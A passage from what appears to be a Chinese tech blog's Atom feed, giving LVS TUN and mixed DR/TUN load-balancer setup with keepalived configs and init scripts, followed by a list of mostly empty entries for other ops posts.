  }    virtual_ipaddress {        10.10.36.11/23 dev em1    }}virtual_server 10.10.36.11 80 {    delay_loop 6    lb_algo rr    lb_kind TUN    protocol TCP    real_server 10.10.36.4 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 80        }    }    real_server 10.10.36.7 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 80        }    }}# enable and start keepalivedsystemctl start keepalivedsystemctl enable keepalivedwatch ipvsadm -L -n --stats# &#x7F16;&#x5199; DS &#x811A;&#x672C;&#xFF0C;&#x63A8;&#x8350;&#x7528; keepalived &#x914D;&#x7F6E;&#x6587;&#x4EF6;#!/bin/sh# Startup script handle the initialisation of LVS# chkconfig: - 28 72# description: Initialise the Linux Virtual Server for TUN#### BEGIN INIT INFO# Provides: ipvsadm# Required-Start: $local_fs $network $named# Required-Stop: $local_fs $remote_fs $network# Short-Description: Initialise the Linux Virtual Server# Description: The Linux Virtual Server is a highly scalable and highly#   available server built on a cluster of real servers, with the load#   balancer running on Linux.# description: start LVS of TUNLOCK=/var/lock/lvs-tun.lockVIP=10.10.36.11RIP1=10.10.36.4RIP2=10.10.36.7. /etc/rc.d/init.d/functionsstart()    {     PID=`ipvsadm -Ln | grep ${VIP} | wc -l`     if    [ $PID -gt 0 ];     then           echo &quot;The LVS-TUN Server is already running !&quot;     else           #Load the tun mod           /sbin/modprobe tun           /sbin/modprobe ipip           #Set the tun Virtual IP Address           /sbin/ifconfig tunl0 $VIP broadcast $VIP netmask 255.255.255.255 up           /sbin/route add -host $VIP dev tunl0           #Clear IPVS Table           /sbin/ipvsadm -C           #The icmp recruit setting           echo &quot;0&quot; &gt;/proc/sys/net/ipv4/ip_forward           echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/all/send_redirects           echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/default/send_redirects           #Set Lvs           /sbin/ipvsadm -At $VIP:80 -s rr           /sbin/ipvsadm -at $VIP:80 -r $RIP1:80 -i  -w 1           /sbin/ipvsadm -at $VIP:80 -r $RIP2:80 -i  -w 1           /bin/touch $LOCK           #Run Lvs           echo &quot;starting LVS-TUN-DIR Server is ok !&quot;     fi}stop()    {           #stop  Lvs server           /sbin/ipvsadm -C           /sbin/ifconfig tunl0 down &gt;/dev/null           #Remove the tun mod           /sbin/modprobe -r tun           /sbin/modprobe -r ipip           rm -rf $LOCK           echo &quot;stopping LVS-TUN-DIR server is ok !&quot;}status()  {     if [ -e $LOCK ];     then         echo &quot;The LVS-TUN Server is already running !&quot;     else         echo &quot;The LVS-TUN Server is not running !&quot;     fi}case &quot;$1&quot; in  start)        start        ;;  stop)        stop        ;;  restart)        stop        sleep 1        start        ;;  status)        status        ;;  *)        echo &quot;Usage: $1 {start|stop|restart|status}&quot;        exit 1esacexit 0</code></pre><p><strong>RS</strong></p><pre><code class="shell"># &#x5728;&#x52A0;&#x8F7D;&#x597D; ipip &#x6A21;&#x5757;&#x540E;&#x5C31;&#x4F1A;&#x6709;&#x9ED8;&#x8BA4;&#x7684; tunl0 &#x96A7;&#x9053;modprobe ipip# &#x6DFB;&#x52A0; VIP# ifconfig tunl0 downifconfig tunl0 10.10.36.11 broadcast 10.10.36.11 netmask 255.255.255.255 up# &#x6DFB;&#x52A0;&#x8DEF;&#x7531;route add -host 10.10.36.11 tunl0# &#x624B;&#x52A8;&#x5173;&#x95ED; ARP &#x8F6C;&#x53D1;echo &apos;1&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/arp_ignore echo &apos;2&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/arp_announceecho &apos;1&apos; &gt; /proc/sys/net/ipv4/conf/all/arp_ignoreecho &apos;2&apos; &gt; /proc/sys/net/ipv4/conf/all/arp_announce echo &apos;0&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/rp_filterecho &apos;0&apos; &gt; /proc/sys/net/ipv4/conf/all/rp_filter # iptables &#x5141;&#x8BB8; ipip &#x534F;&#x8BAE;iptables -I INPUT 1 -p 4 -j ACCEPTvim /etc/sysconfig/iptables-A INPUT -p ipv4 -j ACCEPT# &#x7F16;&#x5199; RS &#x542F;&#x505C;&#x811A;&#x672C;vim /etc/init.d/lvs-tun#!/bin/sh## Startup script handle the initialisation of LVS# chkconfig: - 28 72# description: Initialise the Linux Virtual Server for TUN#### BEGIN INIT INFO# Provides: ipvsadm# Required-Start: $local_fs $network $named# Required-Stop: $local_fs $remote_fs $network# Short-Description: Initialise the Linux Virtual Server# Description: The Linux Virtual Server is a highly scalable and highly#   available server built on a cluster of real servers, with the load#   balancer running on Linux.# description: start LVS of TUN-RIPLOCK=/var/lock/ipvsadm.lockVIP=10.10.36.11. /etc/rc.d/init.d/functionsstart() {     PID=`ifconfig | grep tunl0 | wc -l`     if [ $PID -ne 0 ];     then         echo &quot;The LVS-TUN-RIP Server is already running !&quot;     else         #Load the tun mod         /sbin/modprobe tun         /sbin/modprobe ipip         #Set the tun Virtual IP Address         /sbin/ifconfig tunl0 $VIP netmask 255.255.255.255 broadcast $VIP up         /sbin/route add -host $VIP dev tunl0         echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/tunl0/arp_ignore         echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/tunl0/arp_announce         echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore         echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce         echo &quot;0&quot; &gt; /proc/sys/net/ipv4/conf/tunl0/rp_filter         echo &quot;0&quot; &gt; /proc/sys/net/ipv4/conf/all/rp_filter         /bin/touch $LOCK         echo &quot;starting LVS-TUN-RIP server is ok !&quot;     fi}stop() {         /sbin/ifconfig tunl0 down         echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/tunl0/arp_ignore         echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/tunl0/arp_announce         echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore         echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce         #Remove the tun mod         /sbin/modprobe -r tun         /sbin/modprobe -r ipip         rm -rf $LOCK         echo &quot;stopping LVS-TUN-RIP server is ok !&quot;}status() {     if [ -e $LOCK ];     then        echo &quot;The LVS-TUN-RIP Server is already running !&quot;     else        echo &quot;The LVS-TUN-RIP Server is not running !&quot;     fi}case &quot;$1&quot; in  start)        start        ;;  stop)        stop        ;;  restart)        stop        start        ;;  status)        status        ;;  *)        echo &quot;Usage: $1 {start|stop|restart|status}&quot;        exit 1esacexit 0# start lvs-tunchmod 755 /etc/init.d/lvs-tunservice lvs-tun startchkconfig lvs-tun on# Nginx testecho &quot;rs1&quot; &gt; /usr/share/nginx/html/index.htmlecho &quot;rs2&quot; &gt; /usr/share/nginx/html/index.htmlfor i in {1..100}; do curl 10.10.36.11; sleep 0.5; done</code></pre><p>&#x8FD9;&#x4E00;&#x6B65;&#x7684;&#x4E3B;&#x8981;&#x76EE;&#x7684;&#x662F;&#x8BA9; RS &#x7981;&#x8A00;&#xFF0C;&#x5728;&#x76F8;&#x5BF9;&#x8F83;&#x65B0;&#x7684;&#x7248;&#x672C;&#x4E2D;&#x65B0;&#x589E;&#x4E86;&#x4E24;&#x4E2A;&#x5185;&#x6838;&#x53C2;&#x6570; (kernel parameter)</p><ul><li>&#x7B2C;&#x4E00;&#x4E2A;&#x662F; arp_ignore &#x5B9A;&#x4E49;&#x63A5;&#x53D7;&#x5230; ARP &#x8BF7;&#x6C42;&#x65F6;&#x7684;&#x76F8;&#x5E94;&#x7EA7;&#x522B;</li><li>&#x7B2C;&#x4E8C;&#x4E2A;&#x662F; arp_announce &#x5B9A;&#x4E49;&#x5C06;&#x81EA;&#x5DF1;&#x5730;&#x5740;&#x5411;&#x5916;&#x901A;&#x544A;&#x662F;&#x7684;&#x901A;&#x544A;&#x7EA7;&#x522B;</li><li>&#x7B2C;&#x4E09;&#x4E2A;&#x662F; rp_filter &#x5B9A;&#x4E49;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5F00;&#x542F;&#x5BF9;&#x6570;&#x636E;&#x5305;&#x6E90;&#x5730;&#x5740;&#x7684;&#x6821;&#x9A8C;  </li></ul><p>&#x603B;&#x7ED3;: LVS/TUN &#x662F;&#x6240;&#x6709;&#x6A21;&#x5F0F;&#x4E2D;&#x6700;&#x6700;&#x9002;&#x7528;&#x4E8E;&#x8DE8;&#x7F51;&#x7EDC;&#x8DE8;&#x5730;&#x57DF;&#x5730;&#x7406;&#x4F4D;&#x7F6E;&#x7684;&#x4E00;&#x79CD;&#x6A21;&#x5F0F;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;:  </p><ul><li>&#x82E5; DIR &#x548C; RIP &#x5728;&#x4E0D;&#x540C; lan &#x7F51;&#x7EDC;&#x4E2D;&#xFF0C;&#x6BD4;&#x5982;&#x4E0D;&#x540C;&#x7684;&#x7F51;&#x6BB5;&#xFF0C;&#x4E0D;&#x540C;&#x7684; IDC &#x673A;&#x623F;&#xFF0C;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x8BBE;&#x7F6E; arp &#x4EF0;&#x5236;&#xFF0C;&#x4E0D;&#x540C;&#x7F51;&#x6BB5;&#x4E2D;&#xFF0C;arp &#x4F1A;&#x88AB;&#x5C4F;&#x853D;&#x6389;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x9700;&#x8BBE;&#x7F6E; ip tunne &#x4EE5;&#x53CA;&#x62A5;&#x6587;&#x53CD;&#x5411;&#x9A8C;&#x8BC1;&#x5373;&#x53EF;&#xFF1B;</li><li>&#x82E5; DIR &#x548C; RIP &#x5728;&#x540C;&#x4E00;&#x5E7F;&#x64AD;&#x57DF;&#x4E2D;&#xFF0C;&#x9700;&#x8981;&#x548C; LVS/DR &#x6A21;&#x5F0F;&#x4E00;&#x6837;&#x5728;&#x6240;&#x6709;&#x7684; RIP &#x4E0A;&#x4EF0;&#x5236; arp&#xFF0C;&#x9632;&#x6B62; arp &#x54CD;&#x5E94;&#x5BFC;&#x81F4; arp &#x8868;&#x6DF7;&#x4E71;&#xFF0C;&#x8FD9;&#x6837; lvs &#x5C31;&#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;&#xFF01;</li></ul><p>&#x914D;&#x7F6E;&#x65F6;&#x9664;&#x4E86;&#x914D;&#x7F6E; DIR&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x540E;&#x7AEF; RS server&#xFF0C;&#x5373;&#x5728; tunl &#x4E0A;&#x53E3;&#x914D;&#x7F6E; vip &#x5730;&#x5740;&#xFF08;&#x9700;&#x8981;&#x7CFB;&#x7EDF;&#x652F;&#x6301; tunl &#x624D;&#x884C;&#xFF09;&#xFF0C;&#x5E7F;&#x64AD;&#x4E3A;&#x81EA;&#x5DF1;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x4E0B;&#x65E0;&#x9700;&#x5F00;&#x542F;&#x8DEF;&#x7531;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#xFF01;</p><h4 id="&#x914D;&#x7F6E;-LVS-DR-&#x548C;-LVS-TUN-&#x6DF7;&#x5408;&#x6A21;&#x5F0F;"><a href="#&#x914D;&#x7F6E;-LVS-DR-&#x548C;-LVS-TUN-&#x6DF7;&#x5408;&#x6A21;&#x5F0F;" class="headerlink" title="&#x914D;&#x7F6E; LVS/DR &#x548C; LVS/TUN &#x6DF7;&#x5408;&#x6A21;&#x5F0F;"></a>&#x914D;&#x7F6E; LVS/DR &#x548C; LVS/TUN &#x6DF7;&#x5408;&#x6A21;&#x5F0F;</h4><p><strong>DS</strong></p><pre><code># &#x5173;&#x4E8E; 3 &#x4E2D;&#x6A21;&#x5F0F;&#x7684;&#x53C2;&#x6570;[packet-forwarding-method]       -g, --gatewaying  Use gatewaying (direct routing). This is the default.       -i, --ipip  Use ipip encapsulation (tunneling).       -m, --masquerading  Use masquerading (network access translation, or NAT).       Note:  Regardless of the packet-forwarding mechanism specified, real servers for addresses for which there are interfaces on the local node will  be  use  the       local  forwarding  method, then packets for the servers will be passed to upper layer on the local node. This cannot be specified by ipvsadm, rather it set by       the kernel as real servers are added or modified.# ipvsadm &#x547D;&#x4EE4;&#x884C;&#x6DF7;&#x914D;/sbin/ifconfig tunl0 10.10.36.11 broadcast 10.10.36.11 netmask 255.255.255.255 up/sbin/route add -host 10.10.36.11 dev tunl0/sbin/ipvsadm -At 10.10.36.11:80 -s rr/sbin/ipvsadm -at 10.10.36.11:80 -r 10.10.36.4:80 -g -w 1/sbin/ipvsadm -at 10.10.36.11:80 -r 10.10.36.7:80 -i -w 1# keepalived &#x6DF7;&#x914D;vrrp_sync_group GOP {    group {        VI_PRI_AUTH    }}vrrp_instance VI_PRI_AUTH {    state BACKUP    interface em1    virtual_router_id 11    priority 100    advert_int 1    nopreempt    authentication {        auth_type PASS        auth_pass 1111    }    virtual_ipaddress {        10.10.36.11/23 dev em1    }}virtual_server 10.10.36.11 80 {    delay_loop 6    lb_algo rr    lb_kind DR    protocol TCP    real_server 10.10.36.4 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 80        }    }}virtual_server 10.10.36.11 80 {    delay_loop 6    lb_algo rr    lb_kind TUN    protocol TCP    real_server 10.10.36.7 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 80        }    }}# &#x68C0;&#x67E5;&#x7ED3;&#x679C;&#x53EF;&#x7528;[root@d126027 wangao]# for i in {1..100}; do curl 10.10.36.11; sleep 0.5; doners2rs1rs2rs1rs2[root@d126009 keepalived]# ipvsadm -Ln --statsIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port               Conns   InPkts  OutPkts  InBytes OutBytes  -&gt; RemoteAddress:PortTCP  10.10.36.11:80                    100      700        0    36700        0  -&gt; 10.10.36.4:80                      50      350        0    18350        0  -&gt; 10.10.36.7:80                      50      350        0    18350        0</code></pre><p><strong>RS</strong></p><blockquote><p>DR &#x548C; TUN &#x7684;&#x6A21;&#x5F0F;&#x57FA;&#x672C;&#x4E0D;&#x7528;&#x505A;&#x6539;&#x52A8;</p></blockquote><h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;</h2><p>LVS+KeepAlived&#x5B9E;&#x73B0;&#x9AD8;&#x53EF;&#x7528;&#x8D1F;&#x8F7D;&#x5747;&#x8861; <a href="https://www.cnblogs.com/Sinte-Beuve/p/13392747.html" target="_blank" rel="noopener">https://www.cnblogs.com/Sinte-Beuve/p/13392747.html</a></p><p>LVS&#x548C;KeepAlived&#x7684;&#x539F;&#x7406;&#x4ECB;&#x7ECD;&#x548C;&#x914D;&#x7F6E;&#x5B9E;&#x8DF5; <a href="https://wsgzao.github.io/post/lvs-keepalived/&#x6CE8;&#x610F;" target="_blank" rel="noopener">https://wsgzao.github.io/post/lvs-keepalived/&#x6CE8;&#x610F;</a>:</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;keepalived相关&quot;&gt;&lt;a href=&quot;#keepalived相关&quot; class=&quot;headerlink&quot; title=&quot;keepalived相关&quot;&gt;&lt;/a&gt;keepalived相关&lt;/h2&gt;&lt;p&gt;keepalive的学习参考网站：&lt;a href=&quot;https://www.keepalived.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.keepalived.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在学习keepalived之前, 我们来思考一个问题：&lt;strong&gt;LVS只是负责负载均衡的转发，那如果后台的Real Server的服务挂掉以后，LVS是否能主动把这个摘除掉吗？&lt;/strong&gt; 答案是：&lt;strong&gt;肯定不行的&lt;/strong&gt;，就是LVS不具备把后端挂掉的Real Server摘除掉，所以keepalived的应用而生。&lt;/p&gt;
&lt;p&gt;keepalived 起初就是为LVS设计的，专门用来监控集群系统中各个服务节点的状态，&lt;strong&gt;它根据tcp/ip参考模型的第三四和第五层交换机制检测每个服务节点的状态，每个服务节点异常或者工作障碍，keepalvied将立刻检测到，并把障碍节点剔除，是毫秒级的&lt;/strong&gt;，当后台节点恢复正常以后，keepalived有自动将服务节点重新添加在服务器集群中。&lt;br&gt;
    
    </summary>
    
    
      <category term="LVS" scheme="https://marnm.github.io/tags/LVS/"/>
    
      <category term="KeepAlived" scheme="https://marnm.github.io/tags/KeepAlived/"/>
    
  </entry>
  
  <entry>
    <title>使用HAProxy实现七层负载均衡</title>
    <link href="https://marnm.github.io//posts/da58b03e/"/>
    <id>https://marnm.github.io//posts/da58b03e/</id>
    <published>2022-06-08T02:30:51.000Z</published>
    <updated>2022-06-10T00:55:39.525Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>KVM虚拟机迁移</title>
    <link href="https://marnm.github.io//posts/16305c66/"/>
    <id>https://marnm.github.io//posts/16305c66/</id>
    <published>2022-06-07T05:45:42.000Z</published>
    <updated>2022-06-07T05:46:04.451Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>KVM虚拟机添加磁盘</title>
    <link href="https://marnm.github.io//posts/d69c6e72/"/>
    <id>https://marnm.github.io//posts/d69c6e72/</id>
    <published>2022-06-07T05:45:36.000Z</published>
    <updated>2022-06-07T05:46:04.447Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>KVM虚拟机克隆和快照</title>
    <link href="https://marnm.github.io//posts/204af86b/"/>
    <id>https://marnm.github.io//posts/204af86b/</id>
    <published>2022-06-07T05:45:27.000Z</published>
    <updated>2022-06-07T05:46:04.448Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>KVM图形化</title>
    <link href="https://marnm.github.io//posts/dba5727f/"/>
    <id>https://marnm.github.io//posts/dba5727f/</id>
    <published>2022-06-07T05:45:11.000Z</published>
    <updated>2022-06-07T05:46:04.446Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于Docker搭建Prometheus</title>
    <link href="https://marnm.github.io//posts/e364486e/"/>
    <id>https://marnm.github.io//posts/e364486e/</id>
    <published>2022-06-07T05:44:56.000Z</published>
    <updated>2022-06-07T05:46:04.469Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Zabbix4.0</title>
    <link href="https://marnm.github.io//posts/7034657d/"/>
    <id>https://marnm.github.io//posts/7034657d/</id>
    <published>2022-06-07T05:44:25.000Z</published>
    <updated>2022-06-07T05:46:04.463Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Zabbix3.4邮件报警配置</title>
    <link href="https://marnm.github.io//posts/59089347/"/>
    <id>https://marnm.github.io//posts/59089347/</id>
    <published>2022-06-07T05:44:11.000Z</published>
    <updated>2022-06-07T05:46:04.462Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>邮件报警配置</title>
    <link href="https://marnm.github.io//posts/undefined/"/>
    <id>https://marnm.github.io//posts/undefined/</id>
    <published>2022-06-07T05:43:47.000Z</published>
    <updated>2022-06-07T05:43:47.769Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置Zabbix3.4监控Apache服务</title>
    <link href="https://marnm.github.io//posts/76011417/"/>
    <id>https://marnm.github.io//posts/76011417/</id>
    <published>2022-06-07T05:43:37.000Z</published>
    <updated>2022-06-07T05:46:04.478Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于LNMP架构搭建企业级开源监控系统Zabbix</title>
    <link href="https://marnm.github.io//posts/69c239dd/"/>
    <id>https://marnm.github.io//posts/69c239dd/</id>
    <published>2022-06-07T05:43:19.000Z</published>
    <updated>2022-06-07T05:46:04.470Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置Docker静态IP</title>
    <link href="https://marnm.github.io//posts/5095a46f/"/>
    <id>https://marnm.github.io//posts/5095a46f/</id>
    <published>2022-06-07T05:43:03.000Z</published>
    <updated>2022-06-07T05:46:04.477Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭建JumpServer管理王者荣耀数万台游戏服务器</title>
    <link href="https://marnm.github.io//posts/4f96852/"/>
    <id>https://marnm.github.io//posts/4f96852/</id>
    <published>2022-06-07T05:42:33.000Z</published>
    <updated>2022-06-07T05:46:04.475Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Git版本控制</title>
    <link href="https://marnm.github.io//posts/ca9298d7/"/>
    <id>https://marnm.github.io//posts/ca9298d7/</id>
    <published>2022-06-07T05:42:15.000Z</published>
    <updated>2022-06-07T05:46:04.445Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
